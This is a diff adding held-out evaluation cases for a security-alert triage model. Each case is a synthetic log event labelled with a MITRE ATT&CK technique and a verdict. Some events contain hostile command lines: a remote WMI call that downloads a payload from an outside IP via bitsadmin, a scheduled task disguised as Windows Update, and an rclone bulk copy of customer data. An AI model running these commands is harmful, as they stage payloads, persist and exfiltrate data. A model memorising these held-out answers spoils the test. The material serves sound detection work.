@@ -1,0 +1,166 @@
+# Completely hand-authored blind cases — not in golden/, otrf/, or seed SCENARIOS.
+# Use only for held-out eval of the attack adapter.
+- id: blind-wmi-remote-exec
+  technique: {id: T1047, name: Windows Management Instrumentation, tactic: Execution, confidence: 0.86}
+  disposition: true_positive
+  category: execution
+  severity: [high, 78]
+  event:
+    timestamp: "2025-01-14T19:03:11Z"
+    source: sysmon
+    host: jump-07
+    user: CORP\\svc_deploy
+    raw:
+      EventID: 1
+      Image: "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"
+      CommandLine: "WmiPrvSE.exe -Embedding"
+      ParentCommandLine: "wmic /node:\"10.0.4.22\" process call create \"cmd.exe /c bitsadmin /transfer job http://185.199.108.153/p.bin C:\\Windows\\Temp\\p.bin\""
+    message: "wmic /node:\"10.0.4.22\" process call create \"cmd.exe /c bitsadmin /transfer job http://185.199.108.153/p.bin C:\\Windows\\Temp\\p.bin\""
+  evidence_field: message
+  evidence_value: "wmic /node:\"10.0.4.22\" process call create"
+  evidence_why: "Remote WMI process create with BITS download to Temp."
+  summary: "Remote WMI execution used to stage a payload on 10.0.4.22."
+
+- id: blind-scheduled-task-xml
+  technique: {id: T1053.005, name: Scheduled Task, tactic: Persistence, confidence: 0.84}
+  disposition: true_positive
+  category: persistence
+  severity: [high, 74]
+  event:
+    timestamp: "2025-01-15T08:41:00Z"
+    source: sysmon
+    host: acct-12
+    user: jlee
+    raw:
+      EventID: 1
+      Image: "C:\\Windows\\System32\\schtasks.exe"
+      CommandLine: "schtasks.exe /Create /TN \"Microsoft\\Windows\\Update\\HealthCheck\" /XML C:\\Users\\jlee\\AppData\\Local\\Temp\\upd.xml /F"
+    message: "schtasks.exe /Create /TN \"Microsoft\\Windows\\Update\\HealthCheck\" /XML C:\\Users\\jlee\\AppData\\Local\\Temp\\upd.xml /F"
+  evidence_field: raw.CommandLine
+  evidence_value: "schtasks.exe /Create /TN \"Microsoft\\Windows\\Update\\HealthCheck\" /XML"
+  evidence_why: "Scheduled task created from user Temp XML masquerading as Windows Update."
+  summary: "Persistence via schtasks XML in user Temp."
+
+- id: blind-okta-mfa-fatigue
+  technique: {id: T1621, name: Multi-Factor Authentication Request Generation, tactic: Credential Access, confidence: 0.8}
+  disposition: true_positive
+  category: credential_access
+  severity: [high, 80]
+  event:
+    timestamp: "2025-01-16T02:12:44Z"
+    source: okta
+    host: okta-tenant
+    user: maria.nguyen@example.com
+    raw:
+      eventType: "user.mfa.okta_verify.deny_push"
+      client_ip: "45.133.1.19"
+      count_1h: 27
+      message: "User denied 27 Okta Verify push challenges from 45.133.1.19 within 1 hour"
+    message: "User denied 27 Okta Verify push challenges from 45.133.1.19 within 1 hour"
+  evidence_field: raw.message
+  evidence_value: "denied 27 Okta Verify push challenges"
+  evidence_why: "High-volume MFA push denials suggest MFA fatigue / push bombing."
+  summary: "Okta MFA fatigue pattern against a single user."
+
+- id: blind-cloudtrail-disable-trail
+  technique: {id: T1562.008, name: Disable or Modify Cloud Logs, tactic: Defense Evasion, confidence: 0.88}
+  disposition: true_positive
+  category: defense_evasion
+  severity: [critical, 92]
+  event:
+    timestamp: "2025-01-16T11:05:02Z"
+    source: cloudtrail
+    host: aws-account-2188
+    user: arn:aws:iam::2188:user/temp-ci
+    raw:
+      eventName: StopLogging
+      eventSource: cloudtrail.amazonaws.com
+      requestParameters: "{\"name\":\"org-audit-trail\"}"
+      sourceIPAddress: "52.14.22.9"
+      message: "StopLogging on org-audit-trail by temp-ci from 52.14.22.9"
+    message: "StopLogging on org-audit-trail by temp-ci from 52.14.22.9"
+  evidence_field: raw.eventName
+  evidence_value: "StopLogging"
+  evidence_why: "CloudTrail logging stopped — classic defense evasion."
+  summary: "AWS CloudTrail StopLogging on org audit trail."
+
+- id: blind-dns-tunnel-txt
+  technique: {id: T1071.004, name: DNS, tactic: Command and Control, confidence: 0.83}
+  disposition: true_positive
+  category: command_and_control
+  severity: [high, 81]
+  event:
+    timestamp: "2025-01-17T16:22:10Z"
+    source: zeek
+    host: dns-sensor-3
+    raw:
+      qtype_name: TXT
+      query: "a7f3.e9c1.payload.cdn-updates-check.net"
+      id_orig_h: "10.20.7.44"
+      message: "high-entropy TXT query a7f3.e9c1.payload.cdn-updates-check.net from 10.20.7.44"
+    message: "high-entropy TXT query a7f3.e9c1.payload.cdn-updates-check.net from 10.20.7.44"
+  evidence_field: raw.query
+  evidence_value: "a7f3.e9c1.payload.cdn-updates-check.net"
+  evidence_why: "Chunked high-entropy DNS TXT labels consistent with tunneling."
+  summary: "Suspected DNS TXT tunneling from internal host."
+
+- id: blind-rclone-exfil
+  technique: {id: T1567.002, name: Exfiltration to Cloud Storage, tactic: Exfiltration, confidence: 0.87}
+  disposition: true_positive
+  category: exfiltration
+  severity: [critical, 90]
+  event:
+    timestamp: "2025-01-18T21:09:33Z"
+    source: sysmon
+    host: eng-laptop-9
+    user: dpark
+    raw:
+      EventID: 1
+      Image: "C:\\Users\\dpark\\AppData\\Local\\Programs\\rclone\\rclone.exe"
+      CommandLine: "rclone.exe copy D:\\Projects\\customer-exports remote:backup-bucket --transfers 16 --bwlimit 0"
+    message: "rclone.exe copy D:\\Projects\\customer-exports remote:backup-bucket --transfers 16 --bwlimit 0"
+  evidence_field: raw.CommandLine
+  evidence_value: "rclone.exe copy D:\\Projects\\customer-exports remote:backup-bucket"
+  evidence_why: "Bulk copy of customer data to cloud remote via rclone."
+  summary: "Likely cloud exfiltration of customer-exports via rclone."
+
+- id: blind-benign-ansible
+  technique: {id: T1059.004, name: Unix Shell, tactic: Execution, confidence: 0.3}
+  disposition: benign_true_positive
+  category: execution
+  severity: [low, 18]
+  event:
+    timestamp: "2025-01-19T09:00:00Z"
+    source: other
+    host: cfgmgmt-01
+    user: ansible
+    raw:
+      Image: "/usr/bin/python3"
+      ParentImage: "/usr/bin/ansible-playbook"
+      CommandLine: "python3 /opt/ansible/roles/patch/files/check_uptime.sh"
+      message: "ansible-playbook patch.yml on cfgmgmt-01"
+    message: "ansible-playbook patch.yml spawned check_uptime.sh on cfgmgmt-01"
+  evidence_field: raw.ParentImage
+  evidence_value: "/usr/bin/ansible-playbook"
+  evidence_why: "Known config-management parent; expected automation."
+  summary: "Ansible patch automation — benign true positive."
+
+- id: blind-partial-ldap
+  technique: {id: T1087.002, name: Domain Account, tactic: Discovery, confidence: 0.45}
+  disposition: needs_more_data
+  category: discovery
+  severity: [informational, 20]
+  event:
+    timestamp: "2025-01-19T14:44:00Z"
+    source: windows_security
+    host: dc02
+    user: CORP\\helpdesk01
+    raw:
+      EventID: 4662
+      ObjectName: "CN=Users,DC=corp,DC=local"
+      message: "An operation was performed on an object — LDAP enumerate Users"
+    message: "LDAP enumerate Users by helpdesk01 on dc02"
+  evidence_field: raw.ObjectName
+  evidence_value: "CN=Users,DC=corp,DC=local"
+  evidence_why: "Single LDAP Users enumerate; may be admin work — need more context."
+  summary: "Ambiguous domain account discovery; needs more data."
